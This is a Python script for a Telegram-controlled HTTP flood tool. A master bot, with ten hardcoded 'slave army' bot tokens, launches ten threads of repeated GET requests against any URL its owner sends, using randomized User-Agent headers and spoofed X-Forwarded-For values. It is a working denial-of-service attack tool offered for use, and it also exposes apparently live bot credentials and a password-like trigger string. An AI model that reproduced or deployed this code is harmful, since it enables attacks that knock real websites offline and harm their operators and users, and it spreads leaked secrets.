import os, time, requests, threading, random
from http.server import HTTPServer, BaseHTTPRequestHandler

MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
SLAVE_ARMY = {
    "S1": "8064983761:AAGEZRc9LASS7Fkifm3C3ebOdykCTTJUZ_0",
    "S2": "8460123410:AAE61k-8wPWE4hkmOxge802d8k7CTrhcfCE",
    "S3": "8529444938:AAHd0VxfMeMlA3XSu9NH5RiBcUvRW09atgE",
    "S4": "8500850898:AAEje_m--Tt7eOYjKWwpxXC_BYl2NhiqgVc",
    "S5": "8497321044:AAGGQ2eng3ZgtjOECMRyHO_OJjvSuLTH9RI",
    "S6": "8201736485:AAGFSv-af1506M9pipoaFbHKQW2vLloIMFk",
    "S7": "8420555273:AAHD4mJVw1wY0_nQVSenIBNEaAomcH98sXo",
    "S8": "8524480261:AAGCe54hX-9PjDsVQW5whE36kj5IBNmKRKA",
    "S9": "8579851332:AAGSd7Mtze2XfBlFoQWcIL5JrzBiz47qXAI",
    "S10": "8525114674:AAE7LnGxkqaaL6M0DH25NiU3WYHygWYlON4"
}
MASTER_ID = 1938591484

class HealthCheck(BaseHTTPRequestHandler):
    def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b"SYSTEM_V6_OPERATIONAL")

class SovereignFinalMaster:
    def __init__(self, m_token, s_army):
        self.m_token, self.army = m_token, s_army
        self.api_url = f"https://api.telegram.org/bot{m_token}"
        self.replied_flags = {}
        self.active_targets = {}
        self._notify(MASTER_ID, "🔱 **SYSTEM DEPLOYED: FINAL CORE ONLINE**\nমালিক, আপনার ১০ সদস্যের সেনাবাহিনী এখন আপনার অধীনে।")

    def _notify(self, chat_id, text, token=None, markup=None):
        url = f"https://api.telegram.org/bot{token if token else self.m_token}/sendMessage"
        params = {'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}
        if markup: params['reply_markup'] = markup
        try: requests.post(url, json=params)
        except: pass

    def _get_panel(self):
        return {
            "inline_keyboard": [
                [{"text": "📜 আর্মি লিস্ট ও স্ট্যাটাস", "callback_data": "list_army"}],
                [{"text": "🛠️ রিকভারি স্লট", "callback_data": "recovery_info"}]
            ]
        }

    def _verify_alive(self, slot, token, name):
        time.sleep(5)
        if not self.replied_flags.get(slot):
            try:
                r = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
                if not r.get("ok"): self._notify(MASTER_ID, f"💀 **ALERT:** {slot} ({name}) অফলাইন বা মৃত।")
                else: self._notify(MASTER_ID, f"⚠️ **ALERT:** {slot} ({name}) রেসপন্স করেনি।")
            except: pass
        self.replied_flags[slot] = False

    def _attack(self, target):
        while self.active_targets.get(target):
            try:
                headers = {'User-Agent': random.choice(["Mozilla/5.0", "AppleWebKit/537.36"]), 'X-Forwarded-For': ".".join(map(str, (random.randint(1, 255) for _ in range(4))))}
                requests.get(target, headers=headers, timeout=5)
            except: pass
            time.sleep(random.uniform(0.1, 0.4))

    def listen(self):
        offset = 0
        while True:
            try:
                res = requests.get(f"{self.api_url}/getUpdates?offset={offset}&timeout=15").json()
                for update in res.get('result', []):
                    offset = update['update_id'] + 1
                    if 'callback_query' in update:
                        data = update['callback_query']['data']
                        if data == "list_army":
                            msg = f"📊 **টোটাল ইউনিট: {len(self.army)}**\n"
                            for s, t in self.army.items():
                                try:
                                    r = requests.get(f"https://api.telegram.org/bot{t}/getMe").json()
                                    msg += f"✅ {s}: @{r['result']['username']}\n" if r.get("ok") else f"❌ {s}: DEAD\n"
                                except: msg += f"⚠️ {s}: Error\n"
                            self._notify(MASTER_ID, msg)
                        elif data == "recovery_info": self._notify(MASTER_ID, "📝 `/recovery S[No] [Token]`")
                    elif 'message' in update:
                        msg = update['message']
                        text, uid = msg.get('text', ''), msg.get('from', {}).get('id')
                        if uid != MASTER_ID: continue
                        if text == "Aip2k3052" or text == "/army": self._notify(uid, "🔱 **মাস্টার বোর্ড**", markup=self._get_panel())
                        elif "http" in text:
                            self.active_targets[text] = True
                            self._notify(uid, "⚔️ **ATTACK INITIATED BY 10 UNITS!**")
                            for _ in range(10): threading.Thread(target=self._attack, args=(text,), daemon=True).start()
                        else:
                            for slot, token in self.army.items():
                                try:
                                    r = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
                                    if r.get("ok") and f"@{r['result']['username']}" in text:
                                        self.replied_flags[slot] = False
                                        threading.Thread(target=self._verify_alive, args=(slot, token, r['result']['first_name'])).start()
                                        self._notify(uid, "🤖 **হাজির মালিক!**", token=token)
                                        self.replied_flags[slot] = True
                                except: pass
            except: pass
            time.sleep(1)

if __name__ == "__main__":
    threading.Thread(target=lambda: HTTPServer(('0.0.0.0', 10000), HealthCheck).serve_forever(), daemon=True).start()
    SovereignFinalMaster(MASTER_TOKEN, SLAVE_ARMY).listen()
            
